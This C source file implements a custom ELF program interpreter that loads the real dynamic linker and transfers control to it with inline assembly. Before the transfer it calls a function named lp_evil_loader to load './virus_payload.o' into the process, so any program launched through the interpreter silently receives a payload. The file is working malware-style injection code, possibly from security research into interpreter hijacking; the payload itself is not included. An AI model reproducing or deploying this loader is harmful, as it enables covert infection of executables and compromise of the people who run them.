#include "lp_interp.h"
#include "lp_debug.h"
#define LDSO_TRANSFER(stack, addr, entry) __asm__ __volatile__("mov %0, %%rsp\n" \
                                            "push %1\n" \
                                            "mov %2, %%rax\n" \
                                            "mov $0, %%rbx\n" \
                                            "mov $0, %%rcx\n" \
                                            "mov $0, %%rdx\n" \
                                            "mov $0, %%rsi\n" \
                                            "mov $0, %%rdi\n" \
                                            "mov $0, %%rbp\n" \
					    "mov $0, %%r8\n" \
					    "mov $0, %%r9\n" \
					    "mov $0, %%r10\n" \
					    "mov $0, %%r11\n" \
					    "mov $0, %%r12\n" \
					    "mov $0, %%r13\n" \
					    "mov $0, %%r14\n" \
					    "mov $0, %%r15\n" \
                                            "ret" :: "r" (stack), "g" (addr), "g"(entry))


static void
lp_init_ctx(struct lp_ctx *ctx, char **envp)
{

	lp_debug("Setting ctx->envp to %p: %s\n", envp[0], envp[0]);
	ctx->envp = envp;
	return;
}

int
main(int argc, char **argv)
{
	struct lp_ctx ctx;
	struct lp_auxv_entry entry;
	lp_auxv_iterator_t auxv_iter;
	lp_iterator_res_t res;
	int i;
	uint64_t ldso_ep; /*ldso entry point */
	unsigned long *rsp;

	assert(argv != NULL);
	for (i = 0; argv[i] != NULL; i++)
		;
	lp_init_ctx(&ctx, &argv[i + 1]);
	res = lp_set_procinfo(&ctx);
	if (res == false) {
		lp_debug("lp_set_proc_info(%p) failed\n", &ctx);
		goto fail;
	}
	if (lp_parse_elf(&ctx) == false) {
		lp_debug("failed to parse: %s\n", ctx.proc.exec_proc_path);
		exit(EXIT_FAILURE);
	}
	if (lp_load_elf_interp(&ctx, &ldso_ep) == false) {
		lp_debug("failed to load ELF interpreter: %s\n", ctx.ldso_path);
		exit(EXIT_FAILURE);
	}
	/*
	 * Run module loading code
	 */
        struct evil_linker *linker;

        if (lp_evil_loader("./virus_payload.o", &linker) == false) {
                lp_debug("lp_evil_loader failed\n");
        }

	/*
	 * Prepare to transfer execution to real LDSO
	 */
	/*
	 * Set rsp to near the top of the stack at argc
	 */
	rsp = (unsigned long *)argv;
	rsp--;

	lp_debug("argv: %p, setting rsp to %p\n", argv, rsp);
	lp_debug("Transferring control to %#lx\n", ldso_ep);
	
	lp_auxv_iterator_t aux_iter;
	struct lp_auxv_entry aux_entry;
	lp_auxv_iterator_init(&ctx, &aux_iter);
	unsigned long ep;
	while (lp_auxv_iterator_next(&aux_iter, &aux_entry) == LP_ITER_OK) {
		if (aux_entry.type == AT_ENTRY) {
			ep = aux_entry.value;
			lp_debug("ENTRY: %#lx\n", aux_entry.value);
		}
	}
	lp_debug("Setting entry point for target executable in rax register: %#lx\n", ep);
	LDSO_TRANSFER(rsp, ldso_ep, ep);

	
	lp_debug("exiting\n");
	exit(0);
fail:
	lp_debug("interpreter error: fatal error\n");
	exit(EXIT_FAILURE);
}
